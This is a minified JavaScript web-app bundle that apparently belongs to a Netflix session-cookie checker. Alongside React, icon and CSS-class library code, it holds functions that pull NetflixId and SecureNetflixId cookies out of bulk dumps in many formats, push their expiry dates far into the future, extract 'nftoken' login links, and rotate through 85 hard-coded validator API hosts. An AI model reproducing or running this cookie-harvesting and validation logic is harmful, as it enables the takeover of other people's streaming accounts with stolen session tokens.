        l.onUncaughtError !== void 0 && (i = l.onUncaughtError),
        l.onCaughtError !== void 0 && (u = l.onCaughtError),
        l.onRecoverableError !== void 0 && (s = l.onRecoverableError),
        l.unstable_transitionCallbacks !== void 0 && (f = l.unstable_transitionCallbacks),
        l.formState !== void 0 && (x = l.formState)),
        e = wd(t, 1, !0, e, l ?? null, a, n, i, u, s, f, x),
        e.context = Hd(null),
        l = e.current,
        a = qe(),
        a = Hl(a),
        n = Zl(a),
        n.callback = null,
        Vl(l, n, a),
        l = a,
        e.current.lanes = l,
        cl(e, l),
        ml(e),
        t[ql] = e.current,
        Os(t),
        new ku(e)
    }
    ,
    bi.version = "19.1.0",
    bi
}
var l0;
function th() {
  if (l0)
    return $s.exports;
  l0 = 1;
  function c() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
      try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c)
      } catch (p) {
        console.error(p)
      }
  }
  return c(),
    $s.exports = Pp(),
    $s.exports
}
var eh = th()
  , G = or();
function lh(c, p) {
  const h = c.find(r => r !== null && typeof r == "object" && r.name === p && typeof r.value == "string");
  return h ? h.value : null
}
function Si(c) {
  return c.replace(/^["':,\s]+/, "").replace(/["':,\s]+$/, "").replace(/[.,;)\]\}]+$/, "")
}
function N0(c) {
  return c.length >= 20 && (/^[A-Za-z0-9_\-=&+/%\\.]+$/.test(c) || c.includes("%3D") || c.startsWith("ct=") || c.startsWith("v%3D"))
}
function a0(c, p) {
  const h = c.trim();
  if (h.startsWith("["))
    try {
      const A = JSON.parse(h);
      if (Array.isArray(A)) {
        const q = lh(A, p);
        if (q !== null)
          return q
      }
    } catch { }
  if (h.startsWith("{"))
    try {
      const A = JSON.parse(h);
      if (typeof A.name == "string" && A.name === p && typeof A.value == "string")
        return A.value
    } catch { }
  const r = c.match(new RegExp(`"name"\\s*:\\s*["']?${p}["']?[^}]*?"value"\\s*:\\s*["']([^"']+)["']`, "s"));
  if (r)
    return r[1];
  const S = c.match(new RegExp(`"value"\\s*:\\s*["']([^"']+)["'][^}]*?"name"\\s*:\\s*["']?${p}["']?`, "s"));
  if (S)
    return S[1];
  const R = [new RegExp(`\\b${p}\\s*=\\s*([^\\s;|,\\n\\r]+)`, "i"), new RegExp(`(?<![A-Za-z])${p}["']?\\s*[:]\\s*["']?([^"'\\s;|,\\n\\r]+)`, "i"), new RegExp(`"name"\\s*:\\s*["']?${p}["']?\\s*,\\s*"value"\\s*:\\s*["']([^"']+)["']`, "i"), new RegExp(`"${p}"\\s*:\\s*\\{[^}]*"value"\\s*:\\s*"([^"]+)"`, "is"), new RegExp(`\\t${p}\\t([^\\s\\n\\r]+)`, "i"), new RegExp(`\\b${p}\\s+([^\\s;|,\\n\\r]+)`, "i"), new RegExp(`\\b${p}%3D([^\\s;|,\\n\\r]+)`, "i"), new RegExp(`\\[${p}\\s*[=:]\\s*([^\\];|,\\n\\r]+)\\]`, "i"), ...p === "NetflixId" ? [/NetflixCookies\s*=\s*NetflixId\s*=?\s*([^\s;|]+)/i] : [], ...p === "SecureNetflixId" ? [/NetflixCookies\s*=\s*NetflixId[^|]*?;\s*SecureNetflixId\s*=\s*([^\s;|,\n\r]+)/i] : []];
  for (const A of R) {
    const q = c.match(A);
    if (q?.[1]) {
      const k = Si(q[1]);
      if (k)
        return k
    }
  }
  return null
}
function ah(c) {
  const p = c.match(/([A-Za-z0-9_\-=%\\.]{50,500})/g);
  if (!p)
    return null;
  for (const h of p)
    if (h.includes("%3D"))
      return h;
  return null
}
const nh = /^netflixid$/i
  , ih = /^securenetflixid$/i;
function n0(c, p) {
  for (const h of Object.keys(c))
    if (p.test(h))
      return h;
  return null
}
function i0(c) {
  if (!c.startsWith("["))
    return null;
  let p;
  try {
    p = JSON.parse(c)
  } catch {
    return null
  }
  if (!Array.isArray(p) || p.length === 0)
    return null;
  const h = [];
  let r = !1;
  for (const S of p) {
    if (S === null || typeof S != "object" || Array.isArray(S))
      continue;
    const R = S
      , A = n0(R, nh);
    if (!A || typeof R[A] != "string")
      continue;
    r = !0;
    const q = Si(R[A]);
    if (!N0(q))
      continue;
    const k = n0(R, ih)
      , y = k && typeof R[k] == "string" ? R[k] : null
      , C = y && Si(y) || void 0;
    h.push({
      netflixId: q,
      secureNetflixId: C
    })
  }
  return r ? h : null
}
const uh = /^#\s*Netscape HTTP Cookie File\s*$/im;
function ch(c) {
  const p = (c.match(/NetflixId=/gi) ?? []).length
    , h = (c.match(/\tNetflixId\t/gi) ?? []).length
    , r = (c.match(new RegExp("(?<![A-Za-z])NetflixId\\s*:", "gi")) ?? []).length;
  return Math.max(p, h, r)
}
function u0(c, p) {
  const h = new RegExp(p.source, p.flags.includes("g") ? p.flags : p.flags + "g")
    , r = [];
  let S;
  for (; (S = h.exec(c)) !== null;)
    r.push(S.index),
      S[0].length === 0 && h.lastIndex++;
  if (r.length < 2)
    return null;
  const R = [];
  for (let A = 0; A < r.length; A++) {
    const q = r[A]
      , k = A + 1 < r.length ? r[A + 1] : c.length
      , y = c.slice(q, k).trim();
    y && R.push(y)
  }
  return R
}
function sh(c) {
  const p = c.split(/^\s*[-\u2500]{10,}\s*$/m).map(S => S.trim()).filter(Boolean);
  if (p.length > 1 && p.some(S => /Cookie\s*:/i.test(S) || /NetflixId/i.test(S)))
    return p;
  const h = c.split(/\r?\n[ \t]*\r?\n/).map(S => S.trim()).filter(Boolean)
    , r = [];
  for (const S of h) {
    if (uh.test(S)) {
      const C = S.split(/(?=^#\s*Netscape HTTP Cookie File\s*$)/im).map($ => $.trim()).filter(Boolean);
      if (C.length > 1) {
        r.push(...C);
        continue
      }
    }
    const R = S.split(/\]\s*\r?\n\s*\[|\]\s*\[/);
    if (R.length > 1) {
      R.forEach(C => {
        let $ = C.trim();
        $.startsWith("[") || ($ = "[" + $),
          $.endsWith("]") || ($ = $ + "]"),
          r.push($)
      }
      );
      continue
    }
    if (ch(S) <= 1) {
      r.push(S);
      continue
    }
    const q = S.split(/\r?\n/).map(C => C.trim()).filter(Boolean);
    if (q.length > 1) {
      r.push(...q);
      continue
    }
    const y = u0(S, /SecureNetflixId\s*[=:]/i) ?? u0(S, /\bNetflixId\s*[=:]/i);
    r.push(...y ?? [S])
  }
  return r.length > 0 ? r : [c.trim()]
}
const rh = /^(v%3D[^,\r\n]{30,}),(v%3D[^,\r\n]{10,})(?:,.*)?$/;
function oh(c) {
  const p = c.split(/\r?\n/)
    , h = [];
  for (const r of p) {
    const S = r.trim().match(rh);
    S ? h.push(`NetflixId=${S[1]}
SecureNetflixId=${S[2]}
`) : h.push(r)
  }
  return h.join(`
`)
}
function c0(c) {
  const p = oh(c).replace(/"expirationDate"\s*:\s*\d+/g, '"expirationDate": 999912335929')
    , h = i0(p.trim());
  if (h)
    return h;
  const r = sh(p)
    , S = [];
  for (const R of r) {
    const A = R.trim();
    if (A.startsWith("[")) {
      const tt = i0(A);
      if (tt) {
        S.push(...tt);
        continue
      }
    }
    let q = R;
    const k = R.match(/^Cookie\s*:\s*(.+)$/im);
    k && (q = k[1].trim());
    let y = a0(q, "NetflixId");
    if (!y && !/NetflixId/i.test(q) && (y = ah(q)),
      !y || (y = Si(y),
        !N0(y)))
      continue;
    const C = a0(q, "SecureNetflixId")
      , $ = C && Si(C) || void 0;
    S.push({
      netflixId: y,
      secureNetflixId: $
    })
  }
  return S
}
function fh(c) {
  const p = c.match(/[?&]nftoken=([A-Za-z0-9+/=%.+-]+)/) ?? c.match(/\bnftoken=([A-Za-z0-9+/=%.+-]+)/);
  return p ? p[1].replace(/[.,;)"'\]>]+$/, "").trim() : null
}
function s0(c) {
  const p = new Set
    , h = []
    , r = /https?:\/\/(?:www\.)?netflix\.com[^\s"'<>)]*/g;
  for (const R of c.matchAll(r)) {
    const A = R[0].replace(/[.,;)"'\]>]+$/, "")
      , q = fh(A);
    q && !p.has(q) && (p.add(q),
      h.push(A))
  }
  const S = /\bnftoken=([A-Za-z0-9+/=%.+-]{20,})/g;
  for (const R of c.matchAll(S)) {
    const A = R[1].replace(/[.,;)"'\]>]+$/, "").trim();
    !A || p.has(A) || (p.add(A),
      h.push(`https://www.netflix.com/?nftoken=${A}`))
  }
  return h
}
function dh(c) {
  const p = [{
    name: "NetflixId",
    value: c.netflixId
  }];
  return c.secureNetflixId && p.push({
    name: "SecureNetflixId",
    value: c.secureNetflixId
  }),
    p
}
const mh = "https://netflixvalidatorapi1.vercel.app,https://netflixvalidatorapi2.vercel.app,https://netflixvalidatorapi3.vercel.app,https://netflixvalidatorapi4.vercel.app,https://netflixvalidatorapi5.vercel.app,https://netflixvalidatorapi6.vercel.app,https://netflixvalidatorapi7.vercel.app,https://netflixvalidatorapi8.vercel.app,https://netflixvalidatorapi9.vercel.app,https://netflixvalidatorapi10.vercel.app,https://netflixvalidatorapi11.vercel.app,https://netflixvalidatorapi12.vercel.app,https://netflixvalidatorapi13.vercel.app,https://netflixvalidatorapi14.vercel.app,https://netflixvalidatorapi15.vercel.app,https://netflixvalidatorapi16.vercel.app,https://netflixvalidatorapi17.vercel.app,https://netflixvalidatorapi18.vercel.app,https://netflixvalidatorapi19.vercel.app,https://netflixvalidatorapi20.vercel.app,https://netflixvalidatorapi21.vercel.app,https://netflixvalidatorapi22.vercel.app,https://netflixvalidatorapi23.vercel.app,https://netflixvalidatorapi24.vercel.app,https://netflixvalidatorapi25.vercel.app,https://netflixvalidatorapi26.vercel.app,https://netflixvalidatorapi27.vercel.app,https://netflixvalidatorapi28.vercel.app,https://netflixvalidatorapi29.vercel.app,https://netflixvalidatorapi30.vercel.app,https://netflixvalidatorapi31.vercel.app,https://netflixvalidatorapi32.vercel.app,https://netflixvalidatorapi33.vercel.app,https://netflixvalidatorapi34.vercel.app,https://netflixvalidatorapi35.vercel.app,https://netflixvalidatorapi36.vercel.app,https://netflixvalidatorapi37.vercel.app,https://netflixvalidatorapi38.vercel.app,https://netflixvalidatorapi39.vercel.app,https://netflixvalidatorapi40.vercel.app,https://netflixvalidatorapi41.vercel.app,https://netflixvalidatorapi42.vercel.app,https://netflixvalidatorapi43.vercel.app,https://netflixvalidatorapi44.vercel.app,https://netflixvalidatorapi45.vercel.app,https://netflixvalidatorapi46.vercel.app,https://netflixvalidatorapi47.vercel.app,https://netflixvalidatorapi48.vercel.app,https://netflixvalidatorapi49.vercel.app,https://netflixvalidatorapi50.vercel.app,https://netflixvalidatorapi51.vercel.app,https://netflixvalidatorapi52.vercel.app,https://netflixvalidatorapi53.vercel.app,https://netflixvalidatorapi54.vercel.app,https://netflixvalidatorapi55.vercel.app,https://netflixvalidatorapi56.vercel.app,https://netflixvalidatorapi57.vercel.app,https://netflixvalidatorapi58.vercel.app,https://netflixvalidatorapi59.vercel.app,https://netflixvalidatorapi60.vercel.app,https://netflixvalidatorapi61.vercel.app,https://netflixvalidatorapi62.vercel.app,https://netflixvalidatorapi63.vercel.app,https://netflixvalidatorapi64.vercel.app,https://netflixvalidatorapi65.vercel.app,https://netflixvalidatorapi66.vercel.app,https://netflixvalidatorapi67.vercel.app,https://netflixvalidatorapi68.vercel.app,https://netflixvalidatorapi69.vercel.app,https://netflixvalidatorapi70.vercel.app,https://netflixvalidatorapi71.vercel.app,https://netflixvalidatorapi72.vercel.app,https://netflixvalidatorapi73.vercel.app,https://netflixvalidatorapi74.vercel.app,https://netflixvalidatorapi75.vercel.app,https://netflixvalidatorapi76.vercel.app,https://netflixvalidatorapi77.vercel.app,https://netflixvalidatorapi78.vercel.app,https://netflixvalidatorapi79.vercel.app,https://netflixvalidatorapi80.vercel.app,https://netflixvalidatorapi81.vercel.app,https://netflixvalidatorapi82.vercel.app,https://netflixvalidatorapi83.vercel.app,https://netflixvalidatorapi84.vercel.app,https://netflixvalidatorapi85.vercel.app"
  , fa = mh.split(",").map(c => c.trim().replace(/\/+$/, "")).filter(Boolean);
let Hu = 0;
function ph() {
  if (fa.length === 0)
    return "";
  const c = fa[Hu % fa.length];
  return Hu += 1,
    c
}
function sr() {
  return fa.length
}
function Dl(c) {
  if (fa.length === 0)
    return [""];
  const p = Math.max(1, Math.min(c, fa.length))
    , h = [];
  for (let r = 0; r < p; r++)
    h.push(fa[Hu % fa.length]),
      Hu += 1;
  return h
}
const hh = c => c.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase()
  , gh = c => c.replace(/^([A-Z])|[\s-_]+(\w)/g, (p, h, r) => r ? r.toUpperCase() : h.toLowerCase())
  , r0 = c => {
    const p = gh(c);
    return p.charAt(0).toUpperCase() + p.slice(1)
  }
  , T0 = (...c) => c.filter((p, h, r) => !!p && p.trim() !== "" && r.indexOf(p) === h).join(" ").trim()
  , vh = c => {
    for (const p in c)
      if (p.startsWith("aria-") || p === "role" || p === "title")
        return !0
  }
  ;
var bh = {
  xmlns: "http://www.w3.org/2000/svg",
  width: 24,
  height: 24,
  viewBox: "0 0 24 24",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 2,
  strokeLinecap: "round",
  strokeLinejoin: "round"
};
const yh = G.forwardRef(({ color: c = "currentColor", size: p = 24, strokeWidth: h = 2, absoluteStrokeWidth: r, className: S = "", children: R, iconNode: A, ...q }, k) => G.createElement("svg", {
  ref: k,
  ...bh,
  width: p,
  height: p,
  stroke: c,
  strokeWidth: r ? Number(h) * 24 / Number(p) : h,
  className: T0("lucide", S),
  ...!R && !vh(q) && {
    "aria-hidden": "true"
  },
  ...q
}, [...A.map(([y, C]) => G.createElement(y, C)), ...Array.isArray(R) ? R : [R]]));
const he = (c, p) => {
  const h = G.forwardRef(({ className: r, ...S }, R) => G.createElement(yh, {
    ref: R,
    iconNode: p,
    className: T0(`lucide-${hh(r0(c))}`, `lucide-${c}`, r),
    ...S
  }));
  return h.displayName = r0(c),
    h
}
  ;
const xh = [["path", {
  d: "M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2",
  key: "169zse"
}]]
  , Sh = he("activity", xh);
const zh = [["path", {
  d: "M20 6 9 17l-5-5",
  key: "1gmf2c"
}]]
  , Du = he("check", zh);
const Nh = [["path", {
  d: "m6 9 6 6 6-6",
  key: "qrunsl"
}]]
  , Th = he("chevron-down", Nh);
const _h = [["circle", {
  cx: "12",
  cy: "12",
  r: "10",
  key: "1mglay"
}], ["path", {
  d: "M8 12h8",
  key: "1wcyev"
}]]
  , Eh = he("circle-minus", _h);
const Ah = [["circle", {
  cx: "12",
  cy: "12",
  r: "10",
  key: "1mglay"
}], ["path", {
  d: "m15 9-6 6",
  key: "1uzhvr"
}], ["path", {
  d: "m9 9 6 6",
  key: "z0biqf"
}]]
  , Mh = he("circle-x", Ah);
const Oh = [["path", {
  d: "M12 6v6l4 2",
  key: "mmk7yg"
}], ["circle", {
  cx: "12",
  cy: "12",
  r: "10",
  key: "1mglay"
}]]
  , Rh = he("clock", Oh);
const kh = [["rect", {
  width: "14",
  height: "14",
  x: "8",
  y: "8",
  rx: "2",
  ry: "2",
  key: "17jyea"
}], ["path", {
  d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
  key: "zix9uf"
}]]
  , Cu = he("copy", kh);
const jh = [["path", {
  d: "M12 15V3",
  key: "m9g1x1"
}], ["path", {
  d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
  key: "ih7n3h"
}], ["path", {
  d: "m7 10 5 5 5-5",
  key: "brsn70"
}]]
  , tr = he("download", jh);
const Dh = [["path", {
  d: "M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71",
  key: "1cjeqo"
}], ["path", {
  d: "M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71",
  key: "19qd67"
}]]
  , Ch = he("link", Dh);
const Uh = [["path", {
  d: "M12 2v4",
  key: "3427ic"
}], ["path", {
  d: "m16.2 7.8 2.9-2.9",
  key: "r700ao"
}], ["path", {
  d: "M18 12h4",
  key: "wj9ykh"
}], ["path", {
  d: "m16.2 16.2 2.9 2.9",
  key: "1bxg5t"
}], ["path", {
  d: "M12 18v4",
  key: "jadmvz"
}], ["path", {
  d: "m4.9 19.1 2.9-2.9",
  key: "bwix9q"
}], ["path", {
  d: "M2 12h4",
  key: "j09sii"
}], ["path", {
  d: "m4.9 4.9 2.9 2.9",
  key: "giyufr"
}]]
  , er = he("loader", Uh);
const wh = [["path", {
  d: "M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",
  key: "10ikf1"
}]]
  , lr = he("play", wh);
const Hh = [["path", {
  d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",
  key: "1357e3"
}], ["path", {
  d: "M3 3v5h5",
  key: "1xhq8a"
}]]
  , ar = he("rotate-ccw", Hh);
const qh = [["path", {
  d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
  key: "oel41y"
}]]
  , o0 = he("shield", qh);
const Bh = [["rect", {
  width: "18",
  height: "18",
  x: "3",
  y: "3",
  rx: "2",
  key: "afitv7"
}]]
  , Yh = he("square", Bh);
const Gh = [["path", {
  d: "M10 11v6",
  key: "nco0om"
}], ["path", {
  d: "M14 11v6",
  key: "outv1u"
}], ["path", {
  d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",
  key: "miytrc"
}], ["path", {
  d: "M3 6h18",
  key: "d0wm0j"
}], ["path", {
  d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",
  key: "e791ji"
}]]
  , Xh = he("trash-2", Gh);
const Qh = [["path", {
  d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
  key: "wmoenq"
}], ["path", {
  d: "M12 9v4",
  key: "juzpu7"
}], ["path", {
  d: "M12 17h.01",
  key: "p32p05"
}]]
  , Lh = he("triangle-alert", Qh);
const Zh = [["path", {
  d: "M12 3v12",
  key: "1x0j5s"
}], ["path", {
  d: "m17 8-5-5-5 5",
  key: "7q97r8"
}], ["path", {
  d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
  key: "ih7n3h"
}]]
  , Vh = he("upload", Zh)
  , Zh_zap = he("zap", [["polygon", { points: "13 2 3 14 12 14 11 22 21 10 12 10 13 2", key: "zap1" }]]);
function _0(c) {
  var p, h, r = "";
  if (typeof c == "string" || typeof c == "number")
    r += c;
  else if (typeof c == "object")
    if (Array.isArray(c)) {
      var S = c.length;
      for (p = 0; p < S; p++)
        c[p] && (h = _0(c[p])) && (r && (r += " "),
          r += h)
    } else
      for (h in c)
        c[h] && (r && (r += " "),
          r += h);
  return r
}
function Kh() {
  for (var c, p, h = 0, r = "", S = arguments.length; h < S; h++)
    (c = arguments[h]) && (p = _0(c)) && (r && (r += " "),
      r += p);
  return r
}
const Jh = (c, p) => {
  const h = new Array(c.length + p.length);
  for (let r = 0; r < c.length; r++)
    h[r] = c[r];
  for (let r = 0; r < p.length; r++)
    h[c.length + r] = p[r];
  return h
}
  , $h = (c, p) => ({
    classGroupId: c,
    validator: p
  })
  , E0 = (c = new Map, p = null, h) => ({
    nextPart: c,
    validators: p,
    classGroupId: h
  })
  , qu = "-"
  , f0 = []
  , Wh = "arbitrary.."
  , Fh = c => {
    const p = Ph(c)
      , { conflictingClassGroups: h, conflictingClassGroupModifiers: r } = c;
    return {
      getClassGroupId: A => {
        if (A.startsWith("[") && A.endsWith("]"))
          return Ih(A);
        const q = A.split(qu)
          , k = q[0] === "" && q.length > 1 ? 1 : 0;
        return A0(q, k, p)
      }
      ,
      getConflictingClassGroupIds: (A, q) => {
        if (q) {
          const k = r[A]
            , y = h[A];
          return k ? y ? Jh(y, k) : k : y || f0
        }
        return h[A] || f0
      }
    }
  }
  , A0 = (c, p, h) => {
    if (c.length - p === 0)
      return h.classGroupId;
    const S = c[p]
      , R = h.nextPart.get(S);
    if (R) {
      const y = A0(c, p + 1, R);
      if (y)
        return y
    }
    const A = h.validators;
    if (A === null)
      return;
    const q = p === 0 ? c.join(qu) : c.slice(p).join(qu)
      , k = A.length;
    for (let y = 0; y < k; y++) {
      const C = A[y];
      if (C.validator(q))
        return C.classGroupId
    }
  }
  , Ih = c => c.slice(1, -1).indexOf(":") === -1 ? void 0 : (() => {
    const p = c.slice(1, -1)
      , h = p.indexOf(":")
      , r = p.slice(0, h);
    return r ? Wh + r : void 0
  }
  )()
  , Ph = c => {
    const { theme: p, classGroups: h } = c;
    return tg(h, p)
  }
  , tg = (c, p) => {
    const h = E0();
    for (const r in c) {
      const S = c[r];
      fr(S, h, r, p)
    }
    return h
  }
  , fr = (c, p, h, r) => {
    const S = c.length;
    for (let R = 0; R < S; R++) {
      const A = c[R];
      eg(A, p, h, r)
    }
  }
  , eg = (c, p, h, r) => {
    if (typeof c == "string") {
      lg(c, p, h);
      return
    }
    if (typeof c == "function") {
      ag(c, p, h, r);
      return
    }
    ng(c, p, h, r)
  }
  , lg = (c, p, h) => {
    const r = c === "" ? p : M0(p, c);
    r.classGroupId = h
  }
  , ag = (c, p, h, r) => {
    if (ig(c)) {
      fr(c(r), p, h, r);
      return
    }
    p.validators === null && (p.validators = []),
      p.validators.push($h(h, c))
  }
  , ng = (c, p, h, r) => {
    const S = Object.entries(c)
      , R = S.length;
    for (let A = 0; A < R; A++) {
      const [q, k] = S[A];
      fr(k, M0(p, q), h, r)
    }
  }
  , M0 = (c, p) => {
    let h = c;
    const r = p.split(qu)
      , S = r.length;
    for (let R = 0; R < S; R++) {
      const A = r[R];
      let q = h.nextPart.get(A);
      q || (q = E0(),
        h.nextPart.set(A, q)),
        h = q
    }
    return h
  }
  , ig = c => "isThemeGetter" in c && c.isThemeGetter === !0
  , ug = c => {
    if (c < 1)
      return {
        get: () => { }
        ,
        set: () => { }
      };
    let p = 0
      , h = Object.create(null)
      , r = Object.create(null);
    const S = (R, A) => {
      h[R] = A,
        p++,
        p > c && (p = 0,
          r = h,
          h = Object.create(null))
    }
      ;
    return {
      get(R) {
        let A = h[R];
        if (A !== void 0)
          return A;
        if ((A = r[R]) !== void 0)
          return S(R, A),
            A
      },
      set(R, A) {
        R in h ? h[R] = A : S(R, A)
      }
    }
  }
  , rr = "!"
  , d0 = ":"
  , cg = []
  , m0 = (c, p, h, r, S) => ({
    modifiers: c,
    hasImportantModifier: p,
    baseClassName: h,
    maybePostfixModifierPosition: r,
    isExternal: S
  })
  , sg = c => {
    const { prefix: p, experimentalParseClassName: h } = c;
    let r = S => {
      const R = [];
      let A = 0, q = 0, k = 0, y;
      const C = S.length;
      for (let zt = 0; zt < C; zt++) {
        const Rt = S[zt];
        if (A === 0 && q === 0) {
          if (Rt === d0) {
            R.push(S.slice(k, zt)),
              k = zt + 1;
            continue
          }
          if (Rt === "/") {
            y = zt;
            continue
          }
        }
        Rt === "[" ? A++ : Rt === "]" ? A-- : Rt === "(" ? q++ : Rt === ")" && q--
      }
      const $ = R.length === 0 ? S : S.slice(k);
      let tt = $
        , St = !1;
      $.endsWith(rr) ? (tt = $.slice(0, -1),
        St = !0) : $.startsWith(rr) && (tt = $.slice(1),
          St = !0);
      const Yt = y && y > k ? y - k : void 0;
      return m0(R, St, tt, Yt)
    }
      ;
    if (p) {
      const S = p + d0
        , R = r;
      r = A => A.startsWith(S) ? R(A.slice(S.length)) : m0(cg, !1, A, void 0, !0)
    }
    if (h) {
      const S = r;
      r = R => h({
        className: R,
        parseClassName: S
      })
    }
    return r
  }
  , rg = c => {
    const p = new Map;
    return c.orderSensitiveModifiers.forEach((h, r) => {
      p.set(h, 1e6 + r)
    }
    ),
      h => {
        const r = [];
        let S = [];
        for (let R = 0; R < h.length; R++) {
          const A = h[R]
            , q = A[0] === "["
            , k = p.has(A);
          q || k ? (S.length > 0 && (S.sort(),
            r.push(...S),
            S = []),
            r.push(A)) : S.push(A)
        }
        return S.length > 0 && (S.sort(),
          r.push(...S)),
          r
      }
  }
  , og = c => ({
    cache: ug(c.cacheSize),
    parseClassName: sg(c),
    sortModifiers: rg(c),
    postfixLookupClassGroupIds: fg(c),
    ...Fh(c)
  })
  , fg = c => {
    const p = Object.create(null)
      , h = c.postfixLookupClassGroups;
    if (h)
      for (let r = 0; r < h.length; r++)
        p[h[r]] = !0;
    return p
  }
  , dg = /\s+/
  , mg = (c, p) => {
    const { parseClassName: h, getClassGroupId: r, getConflictingClassGroupIds: S, sortModifiers: R, postfixLookupClassGroupIds: A } = p
      , q = []
      , k = c.trim().split(dg);
    let y = "";
    for (let C = k.length - 1; C >= 0; C -= 1) {
      const $ = k[C]
        , { isExternal: tt, modifiers: St, hasImportantModifier: Yt, baseClassName: zt, maybePostfixModifierPosition: Rt } = h($);
      if (tt) {
        y = $ + (y.length > 0 ? " " + y : y);
        continue
      }
      let re = !!Rt, Tt;
      if (re) {
        const Mt = zt.substring(0, Rt);
        Tt = r(Mt);
        const D = Tt && A[Tt] ? r(zt) : void 0;
        D && D !== Tt && (Tt = D,
          re = !1)
      } else
        Tt = r(zt);
      if (!Tt) {
        if (!re) {
          y = $ + (y.length > 0 ? " " + y : y);
          continue
        }
        if (Tt = r(zt),
          !Tt) {
          y = $ + (y.length > 0 ? " " + y : y);
          continue
        }
        re = !1
      }
      const Gt = St.length === 0 ? "" : St.length === 1 ? St[0] : R(St).join(":")
        , Zt = Yt ? Gt + rr : Gt
        , ot = Zt + Tt;
      if (q.indexOf(ot) > -1)
        continue;
      q.push(ot);
      const Dt = S(Tt, re);
      for (let Mt = 0; Mt < Dt.length; ++Mt) {
        const D = Dt[Mt];
        q.push(Zt + D)
      }
      y = $ + (y.length > 0 ? " " + y : y)
    }
    return y
  }
  , pg = (...c) => {
    let p = 0, h, r, S = "";
    for (; p < c.length;)
      (h = c[p++]) && (r = O0(h)) && (S && (S += " "),
        S += r);
    return S
  }
  , O0 = c => {
    if (typeof c == "string")
      return c;
    let p, h = "";
    for (let r = 0; r < c.length; r++)
      c[r] && (p = O0(c[r])) && (h && (h += " "),
        h += p);
    return h
  }
  , hg = (c, ...p) => {
    let h, r, S, R;
    const A = k => {
      const y = p.reduce((C, $) => $(C), c());
      return h = og(y),
        r = h.cache.get,
        S = h.cache.set,
        R = q,
        q(k)
    }
      , q = k => {
        const y = r(k);
        if (y)
          return y;
        const C = mg(k, h);
        return S(k, C),
          C
      }
      ;
    return R = A,
      (...k) => R(pg(...k))
  }
  , gg = []
  , ne = c => {
    const p = h => h[c] || gg;
    return p.isThemeGetter = !0,
      p
  }
  , R0 = /^\[(?:(\w[\w-]*):)?(.+)\]$/i
  , k0 = /^\((?:(\w[\w-]*):)?(.+)\)$/i
  , vg = /^\d+(?:\.\d+)?\/\d+(?:\.\d+)?$/
  , bg = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/
  , yg = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/
  , xg = /^(rgba?|hsla?|hwb|(ok)?(lab|lch)|color-mix)\(.+\)$/
  , Sg = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/
  , zg = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/
  , oa = c => vg.test(c)
  , pt = c => !!c && !Number.isNaN(Number(c))
  , pl = c => !!c && Number.isInteger(Number(c))
  , nr = c => c.endsWith("%") && pt(c.slice(0, -1))
  , Cl = c => bg.test(c)
  , j0 = () => !0
  , Ng = c => yg.test(c) && !xg.test(c)
  , dr = () => !1
  , Tg = c => Sg.test(c)
  , _g = c => zg.test(c)
  , Eg = c => !L(c) && !Z(c)
  , Ag = c => c.startsWith("@container") && (c[10] === "/" && c[11] !== void 0 || c[11] === "s" && c[16] !== void 0 && c.startsWith("-size/", 10) || c[11] === "n" && c[18] !== void 0 && c.startsWith("-normal/", 10))
  , Mg = c => da(c, U0, dr)
  , L = c => R0.test(c)
  , ja = c => da(c, w0, Ng)
  , p0 = c => da(c, wg, pt)
  , Og = c => da(c, q0, j0)
  , Rg = c => da(c, H0, dr)
  , h0 = c => da(c, D0, dr)
  , kg = c => da(c, C0, _g)
  , Uu = c => da(c, B0, Tg)
  , Z = c => k0.test(c)
  , yi = c => Da(c, w0)
  , jg = c => Da(c, H0)
  , g0 = c => Da(c, D0)
  , Dg = c => Da(c, U0)
  , Cg = c => Da(c, C0)
  , wu = c => Da(c, B0, !0)
  , Ug = c => Da(c, q0, !0)
  , da = (c, p, h) => {
    const r = R0.exec(c);
    return r ? r[1] ? p(r[1]) : h(r[2]) : !1
  }
  , Da = (c, p, h = !1) => {
    const r = k0.exec(c);
    return r ? r[1] ? p(r[1]) : h : !1
  }
  , D0 = c => c === "position" || c === "percentage"
  , C0 = c => c === "image" || c === "url"
  , U0 = c => c === "length" || c === "size" || c === "bg-size"
  , w0 = c => c === "length"
  , wg = c => c === "number"
  , H0 = c => c === "family-name"
  , q0 = c => c === "number" || c === "weight"
  , B0 = c => c === "shadow"
  , Hg = () => {
    const c = ne("color")
